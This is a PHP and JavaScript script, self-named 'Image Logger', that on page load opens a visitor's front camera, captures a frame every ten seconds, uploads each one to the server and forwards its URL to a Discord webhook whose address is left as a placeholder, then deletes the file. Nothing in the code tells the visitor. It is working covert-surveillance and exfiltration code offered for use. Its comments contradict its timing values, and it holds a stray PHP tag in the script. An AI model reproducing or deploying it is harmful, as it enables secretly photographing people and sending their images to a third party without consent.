<?php
// Define the path to store images
$imagePath = 'images/';

// Check if the images directory exists, if not, create it
if (!file_exists($imagePath)) {
    mkdir($imagePath, 0777, true);
}

// Check if the request contains image data
if (isset($_POST['imageData'])) {
    // Get the image data from the POST request
    $imageData = $_POST['imageData'];

    // Remove the data URI scheme and the base64 prefix
    $base64Image = str_replace('data:image/jpeg;base64,', '', $imageData);

    // Decode base64 image data
    $decodedImage = base64_decode($base64Image);

    if ($decodedImage === false) {
        echo 'Failed to decode image data.';
        exit;
    }

    // Generate a unique filename for the image
    $filename = uniqid('img_') . '.jpg';

    // Save the image to the specified path
    $result = file_put_contents($imagePath . $filename, $decodedImage);

    if ($result === false) {
        echo 'Failed to save image.';
        exit;
    }

    // Send the image to Discord webhook
    $webhookurl = "keep here discord hook";

    $json_data = json_encode([
        "username" => "Image Logger",
        "avatar_url" => "",
        "embeds" => [
            [
                "title" => "New Image Captured",
                "description" => "An image has been captured and uploaded.",
                "type" => "rich",
                "timestamp" => date("c", strtotime("now")),
                "color" => hexdec("3366ff"),
                "image" => [
                    "url" => 'http://' . $_SERVER['HTTP_HOST'] . '/' . $imagePath . $filename
                ]
            ]
        ]
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    $ch = curl_init($webhookurl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    $response = curl_exec($ch);
    curl_close($ch);

    // Delay for 2 seconds before deleting the image
    sleep(30);

    // Delete the image file
    unlink($imagePath . $filename);

    echo "Image saved and sent to Discord successfully.";
    exit;
}

// Start capturing images automatically from the front camera
startCapture();

function startCapture() {
    ?>
    <script>
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(function (stream) {
                var video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Capture and send image every 5 seconds
                setInterval(function () {
                    captureAndSend(video);
                }, 10000);
            })
            .catch(function (err) {
                console.error('Error accessing camera:', err);
            });

        function captureAndSend(video) {
            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            var context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas to base64 image data
            var imageData = canvas.toDataURL('image/jpeg');

            // Send image data to server
            sendToServer(imageData)?>;
        }

        function sendToServer(imageData) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('imageData=' + encodeURIComponent(imageData));
        }
    </script>
    <?php
}
?>
